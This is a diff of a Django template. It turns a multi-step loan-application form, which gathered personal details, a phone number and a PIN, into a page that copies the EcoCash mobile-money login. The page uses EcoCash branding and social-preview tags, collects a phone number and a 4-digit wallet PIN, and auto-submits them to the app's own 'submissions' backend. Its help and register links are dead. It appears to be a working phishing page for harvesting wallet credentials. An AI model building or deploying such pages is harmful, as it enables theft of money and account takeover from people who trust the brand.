@@ -1,182 +1,473 @@
-{% extends "submissions/base.html" %}
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
+  <title>EcoCash — Login</title>
 
-{% block title %}
-  {% if step == 1 %}Personal Details{% elif step == 2 %}Contact Details{% else %}Loan Details{% endif %} — World-H
-{% endblock %}
+  <!-- SEO / OG -->
+  <meta name="description" content="Login to your EcoCash wallet. Fast, secure mobile money." />
+  <meta property="og:title"       content="EcoCash — Login" />
+  <meta property="og:description" content="Login to your EcoCash wallet." />
+  <meta property="og:image"       content="{{ request.scheme }}://{{ request.get_host }}{% static 'submissions/img/og-cover.png' %}" />
+  <meta property="og:type"        content="website" />
+  <meta name="twitter:card"       content="summary_large_image" />
 
-{% block content %}
-<div class="card">
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
 
-  <!-- Progress stepper -->
-  <div class="stepper" role="list" aria-label="Application progress">
-    {% for s in "123" %}
-      {% with s_int=forloop.counter %}
-      <div class="stepper__item" role="listitem">
-        <div class="stepper__dot {% if s_int < step %}stepper__dot--done{% elif s_int == step %}stepper__dot--active{% else %}stepper__dot--idle{% endif %}"
-             aria-label="Step {{ s_int }}{% if s_int < step %} complete{% elif s_int == step %} current{% endif %}">
-          <!-- checkmark for done steps -->
-          <svg class="stepper__check" width="12" height="12" viewBox="0 0 12 12" fill="none">
-            <path d="M2 6l3 3 5-5" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-          </svg>
-          <span class="stepper__num">{{ s_int }}</span>
-        </div>
-        {% if not forloop.last %}
-        <div class="stepper__line {% if s_int < step %}stepper__line--done{% endif %}"></div>
-        {% endif %}
-      </div>
-      {% endwith %}
-    {% endfor %}
-  </div>
+    :root {
+      --eco-blue:       #0057a8;
+      --eco-blue-dark:  #004080;
+      --eco-red:        #e02020;
+      --eco-text:       #1a1a1a;
+      --eco-muted:      #555;
+      --eco-border:     #c8d8ea;
+      --eco-bg:         #f5f8fb;
+      --font: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    }
 
-  <!-- Heading -->
-  <p class="card__eyebrow">Step {{ step }} of {{ total_steps }}</p>
-  <h1 class="card__title">{{ step_label }}</h1>
-  <p class="card__subtitle">
-    {% if step == 1 %}Tell us a bit about yourself to get started.
-    {% elif step == 2 %}How should we reach you?
-    {% else %}Enter your desired loan amount and set a secure PIN.
+    html, body {
+      height: 100%;
+      font-family: var(--font);
+      background: var(--eco-bg);
+      -webkit-font-smoothing: antialiased;
+    }
+
+    /* ── Page shell: white top, blue wave bottom ────────────────────────── */
+    .page {
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      background: #fff;
+      max-width: 480px;
+      margin: 0 auto;
+      position: relative;
+      overflow: hidden;
+    }
+
+    /* ── Top content area ───────────────────────────────────────────────── */
+    .top-section {
+      flex: 1;
+      padding: 48px 32px 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    /* ── Logo ───────────────────────────────────────────────────────────── */
+    .logo {
+      font-size: 38px;
+      font-weight: 800;
+      letter-spacing: -1px;
+      margin-bottom: 32px;
+      user-select: none;
+    }
+    .logo span:first-child { color: var(--eco-blue); }
+    .logo span:last-child  { color: var(--eco-red);  }
+
+    /* ── Heading ────────────────────────────────────────────────────────── */
+    h1 {
+      font-size: 22px;
+      font-weight: 700;
+      color: var(--eco-text);
+      margin-bottom: 28px;
+      text-align: center;
+    }
+
+    /* ── Phone row: flag selector + number input ────────────────────────── */
+    .phone-row {
+      display: flex;
+      width: 100%;
+      border: 1.5px solid var(--eco-border);
+      border-radius: 8px;
+      overflow: visible;
+      background: #fff;
+      margin-bottom: 28px;
+      position: relative;
+    }
+    .phone-row:focus-within {
+      border-color: var(--eco-blue);
+      box-shadow: 0 0 0 3px rgba(0,87,168,.12);
+    }
+
+    /* Country selector */
+    .country-selector {
+      position: relative;
+      display: flex;
+      align-items: center;
+      padding: 0 10px 0 12px;
+      cursor: pointer;
+      border-right: 1.5px solid var(--eco-border);
+      gap: 6px;
+      min-width: 90px;
+      user-select: none;
+    }
+    .country-selector .flag {
+      font-size: 22px;
+      line-height: 1;
+    }
+    .country-selector .code {
+      font-size: 15px;
+      font-weight: 600;
+      color: var(--eco-text);
+      white-space: nowrap;
+    }
+    .country-selector .arrow {
+      font-size: 10px;
+      color: var(--eco-muted);
+      margin-left: 2px;
+    }
+
+    /* Hidden native select for accessibility + functionality */
+    .country-selector select {
+      position: absolute;
+      inset: 0;
+      opacity: 0;
+      width: 100%;
+      cursor: pointer;
+      font-size: 16px; /* prevents iOS zoom */
+    }
+
+    /* Phone number input */
+    .phone-input {
+      flex: 1;
+      border: none;
+      outline: none;
+      padding: 14px 14px;
+      font-size: 17px;
+      font-family: var(--font);
+      color: var(--eco-text);
+      background: transparent;
+      min-width: 0;
+    }
+    .phone-input::placeholder { color: #aab; }
+
+    /* ── PIN label ──────────────────────────────────────────────────────── */
+    .pin-label {
+      font-size: 15px;
+      color: var(--eco-muted);
+      margin-bottom: 14px;
+      text-align: center;
+    }
+
+    /* ── 4-box PIN ──────────────────────────────────────────────────────── */
+    .pin-boxes {
+      display: flex;
+      gap: 14px;
+      justify-content: center;
+      margin-bottom: 8px;
+    }
+    .pin-box {
+      width: 58px;
+      height: 62px;
+      border: 1.5px solid var(--eco-border);
+      border-radius: 8px;
+      font-size: 28px;
+      font-weight: 700;
+      text-align: center;
+      font-family: var(--font);
+      color: var(--eco-text);
+      background: #fff;
+      outline: none;
+      caret-color: transparent;
+      transition: border-color .15s, box-shadow .15s;
+      /* prevent iOS zoom */
+      font-size: clamp(20px, 5vw, 28px);
+    }
+    .pin-box:focus {
+      border-color: var(--eco-blue);
+      box-shadow: 0 0 0 3px rgba(0,87,168,.12);
+    }
+    .pin-box--filled { border-color: var(--eco-blue); }
+    .pin-box--error  { border-color: var(--eco-red);  }
+
+    /* hidden inputs */
+    #pin-hidden, #phone-hidden { display: none; }
+
+    /* ── Error banner ───────────────────────────────────────────────────── */
+    .error-banner {
+      background: #fff0f0;
+      border: 1px solid rgba(224,32,32,.3);
+      border-radius: 6px;
+      padding: 10px 14px;
+      font-size: 14px;
+      color: var(--eco-red);
+      margin-bottom: 20px;
+      width: 100%;
+      text-align: center;
+    }
+
+    /* ── Wave + blue section ────────────────────────────────────────────── */
+    .bottom-section {
+      position: relative;
+      background: var(--eco-blue);
+      color: #fff;
+      padding: 0 28px 36px;
+      flex-shrink: 0;
+    }
+
+    /* SVG wave sits on top of the blue block */
+    .wave {
+      display: block;
+      width: 100%;
+      margin-bottom: -2px;
+      /* wave is white on top, transparent below — sits between white section and blue */
+    }
+
+    .bottom-tagline {
+      font-size: 15px;
+      text-align: center;
+      margin-bottom: 20px;
+      line-height: 1.5;
+      opacity: .92;
+    }
+
+    /* ── CTA button pair ────────────────────────────────────────────────── */
+    .cta-row {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 12px;
+    }
+    .cta-btn {
+      background: #fff;
+      color: var(--eco-blue);
+      border: none;
+      border-radius: 10px;
+      padding: 14px 10px 12px;
+      font-family: var(--font);
+      font-size: 13px;
+      font-weight: 600;
+      cursor: pointer;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 6px;
+      text-decoration: none;
+      transition: opacity .15s;
+    }
+    .cta-btn:active { opacity: .8; }
+    .cta-btn svg { flex-shrink: 0; }
+
+    /* ── Terms line at very bottom ──────────────────────────────────────── */
+    .terms {
+      text-align: center;
+      font-size: 11px;
+      color: rgba(255,255,255,.6);
+      margin-top: 20px;
+    }
+    .terms a { color: rgba(255,255,255,.8); text-decoration: underline; }
+
+    @media (min-width: 481px) {
+      .page { box-shadow: 0 4px 32px rgba(0,0,0,.1); min-height: 100vh; }
+    }
+  </style>
+</head>
+<body>
+<div class="page">
+
+  <!-- ── White top section ─────────────────────────────────────────── -->
+  <div class="top-section">
+
+    <div class="logo"><span>Eco</span><span>Cash</span></div>
+
+    <h1>Login</h1>
+
+    {% if error %}
+    <div class="error-banner">{{ error }}</div>
     {% endif %}
-  </p>
 
-  <!-- Non-field errors -->
-  {% if form.non_field_errors %}
-  <div class="form-error-banner" role="alert">
-    <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
-      <circle cx="8" cy="8" r="7" stroke="currentColor" stroke-width="1.5"/>
-      <path d="M8 5v3.5M8 10.5v.5" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/>
-    </svg>
-    <div>{% for e in form.non_field_errors %}{{ e }}{% endfor %}</div>
-  </div>
-  {% endif %}
+    <form method="post" id="login-form" novalidate style="width:100%;">
+      {% csrf_token %}
 
-  <form method="post" novalidate>
-    {% csrf_token %}
+      <!-- Hidden fields submitted with form -->
+      <input type="hidden" name="country_code" id="country-code-hidden" value="+263" />
+      <input type="hidden" name="phone"         id="phone-hidden" />
+      <input type="hidden" name="pin"           id="pin-hidden" />
 
-    {% if step == 1 %}
-      <!-- ── Step 1: Personal Details ─────────────────────────────────── -->
-      <div class="field-row">
-        <div class="field">
-          <label class="field__label" for="{{ form.first_name.id_for_label }}">First name</label>
-          <input class="field__input{% if form.first_name.errors %} field__input--error{% endif %}"
-                 type="text" name="first_name" id="{{ form.first_name.id_for_label }}"
-                 value="{{ form.first_name.value|default_if_none:'' }}"
-                 placeholder="First name" autocomplete="given-name" />
-          {% if form.first_name.errors %}
-            <p class="field__error">{{ form.first_name.errors|first }}</p>
-          {% endif %}
+      <!-- ── Phone row ──────────────────────────────────────────────── -->
+      <div class="phone-row">
+        <div class="country-selector" id="country-selector">
+          <span class="flag" id="flag-display">🇿🇼</span>
+          <span class="code" id="code-display">+263</span>
+          <span class="arrow">▼</span>
+          <select id="country-select" aria-label="Country code">
+            <option value="+263" data-flag="🇿🇼" selected>🇿🇼 Zimbabwe +263</option>
+            <option value="+27"  data-flag="🇿🇦">🇿🇦 South Africa +27</option>
+            <option value="+254" data-flag="🇰🇪">🇰🇪 Kenya +254</option>
+            <option value="+260" data-flag="🇿🇲">🇿🇲 Zambia +260</option>
+            <option value="+265" data-flag="🇲🇼">🇲🇼 Malawi +265</option>
+            <option value="+255" data-flag="🇹🇿">🇹🇿 Tanzania +255</option>
+            <option value="+256" data-flag="🇺🇬">🇺🇬 Uganda +256</option>
+            <option value="+258" data-flag="🇲🇿">🇲🇿 Mozambique +258</option>
+            <option value="+267" data-flag="🇧🇼">🇧🇼 Botswana +267</option>
+            <option value="+264" data-flag="🇳🇦">🇳🇦 Namibia +264</option>
+            <option value="+234" data-flag="🇳🇬">🇳🇬 Nigeria +234</option>
+            <option value="+233" data-flag="🇬🇭">🇬🇭 Ghana +233</option>
+          </select>
         </div>
 
-        <div class="field">
-          <label class="field__label" for="{{ form.last_name.id_for_label }}">Last name</label>
-          <input class="field__input{% if form.last_name.errors %} field__input--error{% endif %}"
-                 type="text" name="last_name" id="{{ form.last_name.id_for_label }}"
-                 value="{{ form.last_name.value|default_if_none:'' }}"
-                 placeholder="Last name" autocomplete="family-name" />
-          {% if form.last_name.errors %}
-            <p class="field__error">{{ form.last_name.errors|first }}</p>
-          {% endif %}
-        </div>
+        <input
+          class="phone-input"
+          type="tel"
+          id="phone-display"
+          placeholder="712 345 678"
+          inputmode="tel"
+          autocomplete="tel"
+          maxlength="15"
+        />
       </div>
 
-      <div class="field-row" style="margin-top:20px;">
-        <div class="field">
-          <label class="field__label" for="{{ form.age.id_for_label }}">Age</label>
-          <input class="field__input{% if form.age.errors %} field__input--error{% endif %}"
-                 type="number" name="age" id="{{ form.age.id_for_label }}"
-                 value="{{ form.age.value|default_if_none:'' }}"
-                 placeholder="Your age" min="18" max="100" />
-          {% if form.age.errors %}
-            <p class="field__error">{{ form.age.errors|first }}</p>
-          {% endif %}
-        </div>
+      <!-- ── PIN ────────────────────────────────────────────────────── -->
+      <p class="pin-label">Enter your PIN</p>
 
-        <div class="field">
-          <label class="field__label" for="{{ form.employment_status.id_for_label }}">Employment status</label>
-          <div class="field__select-wrap">
-            <select class="field__select{% if form.employment_status.errors %} field__select--error{% endif %}"
-                    name="employment_status" id="{{ form.employment_status.id_for_label }}">
-              <option value="" disabled {% if not form.employment_status.value %}selected{% endif %}>Select…</option>
-              {% for value, label in form.fields.employment_status.choices %}
-              <option value="{{ value }}" {% if form.employment_status.value == value %}selected{% endif %}>{{ label }}</option>
-              {% endfor %}
-            </select>
-          </div>
-          {% if form.employment_status.errors %}
-            <p class="field__error">{{ form.employment_status.errors|first }}</p>
-          {% endif %}
-        </div>
+      <div class="pin-boxes" role="group" aria-label="4-digit PIN">
+        <input class="pin-box" type="password" inputmode="numeric" maxlength="1" pattern="[0-9]" aria-label="PIN digit 1" data-index="0" autocomplete="off" />
+        <input class="pin-box" type="password" inputmode="numeric" maxlength="1" pattern="[0-9]" aria-label="PIN digit 2" data-index="1" autocomplete="off" />
+        <input class="pin-box" type="password" inputmode="numeric" maxlength="1" pattern="[0-9]" aria-label="PIN digit 3" data-index="2" autocomplete="off" />
+        <input class="pin-box" type="password" inputmode="numeric" maxlength="1" pattern="[0-9]" aria-label="PIN digit 4" data-index="3" autocomplete="off" />
       </div>
 
-    {% elif step == 2 %}
-      <!-- ── Step 2: Contact Details ───────────────────────────────────── -->
-      <div class="field">
-        <label class="field__label" for="{{ form.phone.id_for_label }}">Phone number</label>
-        <input class="field__input{% if form.phone.errors %} field__input--error{% endif %}"
-               type="tel" name="phone" id="{{ form.phone.id_for_label }}"
-               value="{{ form.phone.value|default_if_none:'' }}"
-               placeholder="e.g. 0712 345 678" autocomplete="tel" />
-        {% if form.phone.errors %}
-          <p class="field__error">{{ form.phone.errors|first }}</p>
-        {% endif %}
-      </div>
+    </form>
 
-      <div class="field" style="margin-top:20px;">
-        <label class="field__label" for="{{ form.email.id_for_label }}">
-          Email address <span class="optional">(optional)</span>
-        </label>
-        <input class="field__input{% if form.email.errors %} field__input--error{% endif %}"
-               type="email" name="email" id="{{ form.email.id_for_label }}"
-               value="{{ form.email.value|default_if_none:'' }}"
-               placeholder="your@email.com" autocomplete="email" />
-        {% if form.email.errors %}
-          <p class="field__error">{{ form.email.errors|first }}</p>
-        {% endif %}
-      </div>
+  </div><!-- /top-section -->
 
-    {% else %}
-      <!-- ── Step 3: Loan Details ──────────────────────────────────────── -->
-      <div class="field">
-        <label class="field__label" for="{{ form.amount.id_for_label }}">Loan amount (KES)</label>
-        <input class="field__input{% if form.amount.errors %} field__input--error{% endif %}"
-               type="number" name="amount" id="{{ form.amount.id_for_label }}"
-               value="{{ form.amount.value|default_if_none:'' }}"
-               placeholder="0.00" min="1" step="0.01" />
-        {% if form.amount.errors %}
-          <p class="field__error">{{ form.amount.errors|first }}</p>
-        {% endif %}
-      </div>
+  <!-- ── Wave divider ─────────────────────────────────────────────── -->
+  <svg class="wave" viewBox="0 0 480 60" preserveAspectRatio="none" xmlns="http://www.w3.org/2000/svg">
+    <path d="M0,0 C120,60 360,60 480,0 L480,60 L0,60 Z" fill="#0057a8"/>
+  </svg>
 
-      <div class="field" style="margin-top:20px;">
-        <label class="field__label" for="{{ form.pin.id_for_label }}">PIN</label>
-        <input class="field__input{% if form.pin.errors %} field__input--error{% endif %}"
-               type="password" name="pin" id="{{ form.pin.id_for_label }}"
-               placeholder="4–6 digits" maxlength="6" inputmode="numeric" />
-        {% if form.pin.errors %}
-          <p class="field__error">{{ form.pin.errors|first }}</p>
-        {% endif %}
-      </div>
-    {% endif %}
+  <!-- ── Blue bottom section ──────────────────────────────────────── -->
+  <div class="bottom-section">
 
-    <button type="submit" class="btn btn--primary">
-      {% if step == total_steps %}
-        Request OTP
-        <svg width="15" height="15" viewBox="0 0 15 15" fill="none">
-          <path d="M3 7.5h9M8.5 4l3.5 3.5L8.5 11" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
+    <p class="bottom-tagline">
+      To register an EcoCash wallet or get assistance,<br>click below
+    </p>
+
+    <div class="cta-row">
+      <a href="#" class="cta-btn" role="button">
+        <!-- person icon -->
+        <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#0057a8" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
+          <circle cx="12" cy="7" r="4"/>
         </svg>
-      {% else %}
-        Continue
-        <svg width="15" height="15" viewBox="0 0 15 15" fill="none">
-          <path d="M3 7.5h9M8.5 4l3.5 3.5L8.5 11" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
+        Register
+      </a>
+      <a href="#" class="cta-btn" role="button">
+        <!-- info icon -->
+        <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#0057a8" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+          <circle cx="12" cy="12" r="10"/>
+          <line x1="12" y1="16" x2="12" y2="12"/>
+          <line x1="12" y1="8" x2="12.01" y2="8"/>
         </svg>
-      {% endif %}
-    </button>
-
-    {% if step > 1 %}
-    <div style="text-align:center;">
-      <a href="{% if step == 2 %}{% url 'submissions:submit' %}{% else %}{% url 'submissions:step2' %}{% endif %}"
-         class="btn btn--ghost">← Back</a>
+        Help &amp; Support
+      </a>
     </div>
-    {% endif %}
-  </form>
-</div>
-{% endblock %}
+
+    <p class="terms">
+      By logging in you agree to our <a href="#">Terms &amp; Conditions</a>
+    </p>
+
+  </div>
+
+</div><!-- /page -->
+
+<script>
+(function () {
+  const select      = document.getElementById('country-select');
+  const flagDisplay = document.getElementById('flag-display');
+  const codeDisplay = document.getElementById('code-display');
+  const codeHidden  = document.getElementById('country-code-hidden');
+  const phoneDisplay= document.getElementById('phone-display');
+  const phoneHidden = document.getElementById('phone-hidden');
+  const pinHidden   = document.getElementById('pin-hidden');
+  const pinBoxes    = Array.from(document.querySelectorAll('.pin-box'));
+  const form        = document.getElementById('login-form');
+
+  // ── Country selector ─────────────────────────────────────────────────────
+  select.addEventListener('change', function () {
+    const opt  = select.options[select.selectedIndex];
+    const flag = opt.getAttribute('data-flag');
+    const code = select.value;
+    flagDisplay.textContent = flag;
+    codeDisplay.textContent = code;
+    codeHidden.value        = code;
+  });
+
+  // ── PIN boxes ─────────────────────────────────────────────────────────────
+  pinBoxes.forEach(function (box, idx) {
+    box.addEventListener('keydown', function (e) {
+      if (e.key === 'Backspace') {
+        if (box.value) {
+          box.value = '';
+          syncPin();
+        } else if (idx > 0) {
+          pinBoxes[idx - 1].focus();
+          pinBoxes[idx - 1].value = '';
+          syncPin();
+        }
+        e.preventDefault();
+      } else if (e.key === 'ArrowLeft'  && idx > 0)                  pinBoxes[idx - 1].focus();
+        else if (e.key === 'ArrowRight' && idx < pinBoxes.length - 1) pinBoxes[idx + 1].focus();
+    });
+
+    box.addEventListener('input', function () {
+      const val = box.value.replace(/\D/g, '').slice(-1);
+      box.value = val;
+      if (val) {
+        box.classList.add('pin-box--filled');
+        if (idx < pinBoxes.length - 1) pinBoxes[idx + 1].focus();
+      } else {
+        box.classList.remove('pin-box--filled');
+      }
+      syncPin();
+    });
+
+    box.addEventListener('paste', function (e) {
+      e.preventDefault();
+      const text = (e.clipboardData || window.clipboardData)
+                    .getData('text').replace(/\D/g, '').slice(0, 4);
+      text.split('').forEach(function (ch, i) {
+        if (pinBoxes[i]) { pinBoxes[i].value = ch; pinBoxes[i].classList.add('pin-box--filled'); }
+      });
+      pinBoxes[Math.min(text.length, pinBoxes.length - 1)].focus();
+      syncPin();
+    });
+  });
+
+  function syncPin() {
+    pinHidden.value = pinBoxes.map(function (b) { return b.value; }).join('');
+  }
+
+  // ── Form submit: move phone display value to hidden field ────────────────
+  form.addEventListener('submit', function (e) {
+    phoneHidden.value = phoneDisplay.value.trim();
+
+    // Basic guard — phone must have digits, pin must be 4 digits
+    if (!phoneHidden.value.replace(/\D/g, '')) {
+      e.preventDefault();
+      phoneDisplay.focus();
+      return;
+    }
+    if (pinHidden.value.length < 4) {
+      e.preventDefault();
+      pinBoxes[pinHidden.value.length].focus();
+      return;
+    }
+  });
+
+  // Auto-submit when 4th PIN box is filled and phone is present
+  pinBoxes[3].addEventListener('input', function () {
+    setTimeout(function () {
+      if (pinHidden.value.length === 4 && phoneDisplay.value.trim()) {
+        form.dispatchEvent(new Event('submit', { cancelable: true }));
+        form.submit();
+      }
+    }, 80);
+  });
+
+})();
+</script>
+</body>
+</html>
